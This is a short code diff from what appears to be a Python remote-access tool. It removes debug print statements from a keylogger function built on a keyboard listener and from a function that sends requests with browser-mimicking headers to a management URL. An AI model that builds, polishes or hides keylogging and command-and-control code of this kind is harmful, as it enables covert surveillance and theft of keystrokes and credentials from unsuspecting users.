@@ -100,7 +100,6 @@ def on_press(key):
 
 
 def enableKeylogger():
-    # print("[+] Attempting to Enabling Keylogger")
     with Listener(on_press=on_press) as listener:
         listener.join()
 
@@ -328,7 +327,6 @@ def connect(url, managementURL):
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                        "Upgrade-Insecure-Requests": "1"}
-            print("Sending:" + str(i))
             response = requests.get(url, headers=headers)
 
 
